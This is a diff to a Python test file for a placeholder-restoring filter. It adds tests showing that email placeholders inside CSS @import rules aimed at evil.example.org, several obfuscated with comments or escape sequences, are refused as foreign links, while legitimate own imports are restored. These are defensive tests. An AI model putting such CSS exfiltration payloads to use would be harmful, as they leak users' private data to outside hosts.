@@ -396,6 +396,52 @@ def test_nothing_is_restored_inside_a_foreign_css_url(settings, answer):
 @pytest.mark.parametrize(
     "answer",
     [
+        '@import/**/"https://evil.example.org/?q= <EMAIL_1>";',
+        "<style>@import /* стили */ 'https://evil.example.org/?q= <EMAIL_1>';</style>",
+        '@import\n/* a */ /* b */\n"https://evil.example.org/?q= <EMAIL_1>"',
+        r'@\69mport/**/"https://evil.example.org/?q= <EMAIL_1>";',
+        '@import/**/"https://evil.example.org/?q=;<EMAIL_1>";',
+        "@import /* см. https://evil.example.org/?q=<EMAIL_1>",
+    ],
+)
+def test_nothing_is_restored_inside_an_import_after_a_comment(settings, answer):
+    """Хэнд-офф, P2: между @import и строкой браузер пропускает и комментарии, не только пробелы. Комментарий без
+    конца тянется до конца ответа, как в CSS, и адрес в нём тоже проверяется."""
+    result = restore(link_state(), answer, settings)
+    assert (result.text, kinds(result)) == (answer, ["foreign_link"])
+
+
+@pytest.mark.parametrize(
+    "answer, restored",
+    [
+        (
+            "@import url(https://host-1.domain-1.example/<EMAIL_1>.css);",
+            "@import url(https://srv-dc01.contoso.ru/ivanov@contoso.ru.css);",
+        ),
+        (
+            '@import /* автор <EMAIL_1> */ "https://host-1.domain-1.example/a.css";',
+            '@import /* автор ivanov@contoso.ru */ "https://srv-dc01.contoso.ru/a.css";',
+        ),
+        (
+            '@import "https://evil.example.org/a.css"; /* автор <EMAIL_1> */',
+            '@import "https://evil.example.org/a.css"; /* автор ivanov@contoso.ru */',
+        ),
+        (
+            "Правило @import подключает стили (см. https://wiki.example.org/css), автор <EMAIL_1>",
+            "Правило @import подключает стили (см. https://wiki.example.org/css), автор ivanov@contoso.ru",
+        ),
+    ],
+)
+def test_own_and_nearby_imports_are_restored(settings, answer, restored):
+    """Та же находка с другой стороны: наш адрес в @import и метка в комментарии перед ним восстанавливаются, как и
+    метка после закрытой строки и в тексте, где @import только упомянут: ссылка — лишь пробелы и комментарии за
+    @import и первая строка после них."""
+    assert restore(link_state(), answer, settings).text == restored
+
+
+@pytest.mark.parametrize(
+    "answer",
+    [
         '<style>a{background-image:image-set("https://evil.example.org/?q= <EMAIL_1>" 1x)}</style>',
         "<style>a{background-image:-webkit-image-set('https://evil.example.org/?q= <EMAIL_1>' 1x)}</style>",
         '@font-face { src: src("https://evil.example.org/f?q= <EMAIL_1>") }',
